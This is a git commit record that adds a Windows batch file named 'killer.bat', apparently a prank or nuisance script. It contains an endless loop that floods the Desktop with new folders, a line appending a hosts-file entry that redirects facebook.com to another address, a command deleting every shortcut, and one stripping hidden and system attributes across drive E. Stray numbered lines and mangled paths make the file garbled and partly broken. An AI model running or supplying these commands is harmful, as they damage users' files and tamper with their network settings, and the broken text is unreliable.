b434e29f73708c68843513a70f6123ba0c459e5a
ShutDown <118311269+EmrahPaperotto@users.noreply.github.com>
2023-03-25 23:51:11 +0100

    Create killer.bat

---
+++ killer.bat
@@ -0,0 +1,20 @@
+1
+2
+3
+4
+5
+@echo off
+cd C:Documents and SettingsusernameDesktop
+:loop
+md %RANDOM%
+goto loop
+
+2
+3
+@echo off
+echo 10.184.24.35 www.facebook .com >> C:windowssystem32driversetchosts.txt
+exit
+1
+2
+del *.lnk
+attrib -h -r -s /s /d e:*.*
